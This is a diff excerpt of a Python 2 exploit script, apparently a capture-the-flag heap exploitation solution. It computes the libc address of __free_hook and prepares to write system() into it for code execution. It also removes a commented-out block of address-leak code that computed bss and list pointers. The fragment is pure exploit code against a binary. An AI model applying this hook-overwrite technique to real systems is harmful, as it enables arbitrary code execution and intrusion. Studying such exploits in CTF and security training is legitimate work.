@@ -50,16 +50,6 @@ def main():
     free_hook = libc + free_hook_offset
     print "free_hook: ",hex(free_hook)
 
-    '''
-    # leak text
-    read_until(f," 0x")
-    text = int(f.read(8),16)
-    bss = (text&~0xfff)+0x3020
-    print "bss: ",hex(bss)
-    list = bss + 0x2c
-    print "list: ",hex(list)
-    '''
-
     # set system in __free_hook
     system1 = u(p(system)[:2]+"\x00"*2)
     print hex(system1)
